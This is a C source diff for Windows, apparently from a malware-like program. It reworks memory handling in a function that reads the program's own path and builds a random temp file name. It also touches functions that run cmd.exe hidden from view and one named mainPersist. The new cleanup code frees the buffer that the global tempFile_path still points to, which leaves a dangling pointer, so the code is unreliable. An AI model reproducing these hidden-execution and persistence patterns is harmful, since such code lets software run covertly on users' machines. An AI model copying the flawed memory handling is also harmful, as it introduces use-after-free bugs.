@@ -6,10 +6,22 @@ LPCSTR tempFile_path;
 
 int createTemp() {
 	LPSTR lpTemp = (LPSTR)calloc(MAX_PATH, 1);
-	BYTE randomBuffer[16];
-	LPSTR lpCurrentFileName = (LPSTR)calloc(MAX_PATH, 1);
+	BYTE* randomBuffer = (BYTE*)calloc(16, 1);
+
 	HANDLE tempFile;
 	int return_val = -1;
+	LPSTR lpCurrentFileName = (LPSTR)calloc(MAX_PATH, 1);
+	if (!lpCurrentFileName) {
+		goto CLEANUP;
+	}
+	if (!lpTemp) {
+		goto CLEANUP;
+	}
+
+	if (!randomBuffer) {
+		goto CLEANUP;
+	}
+
 	if (!GetTempPathA(MAX_PATH, lpTemp)) {
 		goto CLEANUP;
 	}
@@ -17,7 +29,6 @@ int createTemp() {
 	if (!GetModuleFileNameA(0, lpCurrentFileName, MAX_PATH)) {
 		goto CLEANUP;
 	}
-
 
 	if (!CryptGenRandom(hCryptProv, 15, randomBuffer)) {
 		goto CLEANUP;
@@ -44,8 +55,15 @@ int createTemp() {
 	return_val = 0;
 	tempFile_path = lpTemp;
 CLEANUP:
-
-	free(lpCurrentFileName);
+	if (randomBuffer) {
+		free(randomBuffer);
+	}
+	if (lpTemp) {
+		free(lpTemp);
+	}
+	if (lpCurrentFileName) {
+		free(lpCurrentFileName);
+	}
 	return return_val;
 }
 
@@ -102,6 +120,7 @@ int environmentSetup() {
 	if ((int)ShellExecuteA(0, "open", "cmd.exe", command, 0, SW_HIDE) <= 32) {
 		return -1;
 	}
+	return 0;
 }
 
 int mainPersist(BOOL start) {
